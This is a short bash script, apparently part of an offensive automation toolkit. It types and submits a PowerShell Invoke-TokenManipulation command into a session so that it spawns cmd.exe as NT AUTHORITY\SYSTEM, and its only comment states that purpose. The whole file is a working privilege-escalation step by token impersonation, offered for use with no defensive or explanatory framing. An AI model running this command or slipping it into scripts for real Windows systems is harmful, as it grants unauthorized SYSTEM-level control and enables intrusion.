#!/bin/bash

: '
ps: Spawns cmd.exe as SYSTEM.
'

paste_command "Invoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"nt authority\system\""
xdotool key Return
